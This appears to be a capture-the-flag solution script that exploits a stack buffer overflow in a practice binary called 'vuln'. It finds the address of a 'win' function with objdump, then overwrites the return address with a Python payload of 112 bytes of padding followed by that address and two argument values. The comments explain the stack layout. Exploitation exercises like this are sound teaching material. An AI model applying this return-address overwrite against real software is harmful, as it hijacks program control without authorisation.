# This is manual solution
# Run:
	objdump -t ../vuln | grep "win" | cut -d' ' -f1
# Use the address with 0x prefix in the next command
	python -c "import struct; \
		print('a'*112+struct.pack('I', 0xPREVIUS_OUTPUT)+ \
		'BBBB'+struct.pack('I',0xdeadbeef)+ \
		struct.pack('I',0xdeadc0de))" | ../vuln
# If you have 64-bit system and you can't run 32-bit files add "qemu-i386" before "../vuln"

# Explanation:
#	The buffer in at offset 104
#	Then the previous stack pointer and the return address

# If we will send 112 bytes and then address
# 	the "return address" will point that address
# 	causing code redirection.
# So if we will use the address of win it will be executed

# Then the stack of win will contain
# 	the next return address: which we will set to garbage ("BBBB")
#	the first argument: 0xdeadbeef
#	the second argument: 0xdeadc0de
